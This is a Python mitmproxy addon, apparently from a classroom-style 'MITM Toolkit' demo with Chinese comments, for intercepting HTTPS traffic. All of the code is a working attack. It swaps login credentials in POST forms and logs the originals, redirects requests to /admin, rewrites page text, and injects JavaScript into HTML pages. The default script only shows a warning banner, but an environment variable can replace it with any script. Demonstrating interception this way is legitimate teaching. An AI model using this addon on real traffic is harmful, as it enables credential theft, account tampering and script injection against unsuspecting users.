"""
mitmproxy addon：攔截並修改 A → B 的 HTTPS 流量
搭配 mitm_tool.py 使用，由 GUI 透過環境變數控制哪些攻擊啟用與其參數。
"""
import os
from mitmproxy import http

# 從環境變數讀取啟用的攻擊規則
ENABLED = set(filter(None, os.environ.get("MITM_RULES", "").split(",")))

# 各規則的參數（含預設值）
FAKE_USER     = os.environ.get("MITM_FAKE_USER",    "hacker")
FAKE_PASS     = os.environ.get("MITM_FAKE_PASS",    "owned_by_C")
REPLACE_FROM  = os.environ.get("MITM_REPLACE_FROM", "登入成功")
REPLACE_TO    = os.environ.get("MITM_REPLACE_TO",   "登入失敗（已被攻擊者竄改）")
REDIRECT_FROM = os.environ.get("MITM_REDIRECT_FROM", "/")
REDIRECT_TO   = os.environ.get("MITM_REDIRECT_TO",   "/admin")

# JS payload（多行，可從環境變數帶；空字串則用內建預設）
DEFAULT_JS = """
<script>
console.log('[MITM] Injected script executed');
document.addEventListener('DOMContentLoaded', function() {
    var banner = document.createElement('div');
    banner.style.cssText = 'position:fixed;top:0;left:0;right:0;background:red;color:white;text-align:center;padding:10px;z-index:99999;font-family:Arial;';
    banner.innerText = '⚠ 你的連線被中間人攔截 (Demo by MITM Toolkit) ⚠';
    document.body.appendChild(banner);
});
</script>
"""
INJECT_JS = os.environ.get("MITM_INJECT_JS") or DEFAULT_JS


def request(flow: http.HTTPFlow) -> None:
    """每個 client 請求進來時觸發"""

    # 規則 1：竄改 POST 表單裡的帳號密碼
    if "cred_swap" in ENABLED:
        if flow.request.method == "POST" and flow.request.urlencoded_form:
            form = flow.request.urlencoded_form
            if "username" in form or "password" in form:
                original = dict(form)
                if "username" in form:
                    form["username"] = FAKE_USER
                if "password" in form:
                    form["password"] = FAKE_PASS
                flow.request.urlencoded_form = form
                print(f"[CRED_SWAP] {original} → {dict(form)}")

    # 規則 2：強制重導向（指定路徑改寫）
    if "redirect" in ENABLED:
        if flow.request.path == REDIRECT_FROM:
            flow.request.path = REDIRECT_TO
            print(f"[REDIRECT] {REDIRECT_FROM} → {REDIRECT_TO}")


def response(flow: http.HTTPFlow) -> None:
    """每個 server 回應出去時觸發"""

    content_type = flow.response.headers.get("content-type", "")

    # 規則 3：在 HTML 頁面注入 JavaScript
    if "inject_js" in ENABLED and "text/html" in content_type:
        try:
            html = flow.response.text
            if "</body>" in html:
                flow.response.text = html.replace("</body>", INJECT_JS + "</body>")
                print(f"[INJECT_JS] 注入腳本到 {flow.request.pretty_url}")
        except Exception as e:
            print(f"[INJECT_JS] 失敗: {e}")

    # 規則 4：竄改回應文字（將 REPLACE_FROM 替換為 REPLACE_TO）
    if "replace_text" in ENABLED and "text/html" in content_type:
        try:
            text = flow.response.text
            if REPLACE_FROM and REPLACE_FROM in text:
                flow.response.text = text.replace(REPLACE_FROM, REPLACE_TO)
                print(f"[REPLACE_TEXT] '{REPLACE_FROM}' → '{REPLACE_TO}'")
        except Exception as e:
            print(f"[REPLACE_TEXT] 失敗: {e}")


def load(loader):
    """addon 載入時印出當前啟用的規則與參數"""
    if ENABLED:
        print(f"[MITM] 啟用的攔截規則: {', '.join(sorted(ENABLED))}")
        if "cred_swap" in ENABLED:
            print(f"  - cred_swap -> {FAKE_USER} / {FAKE_PASS}")
        if "redirect" in ENABLED:
            print(f"  - redirect  -> {REDIRECT_FROM} -> {REDIRECT_TO}")
        if "replace_text" in ENABLED:
            print(f"  - replace_text -> '{REPLACE_FROM}' -> '{REPLACE_TO}'")
        if "inject_js" in ENABLED:
            print(f"  - inject_js -> {len(INJECT_JS)} bytes payload")
    else:
        print(f"[MITM] 未啟用任何攔截規則（純被動側錄模式）")
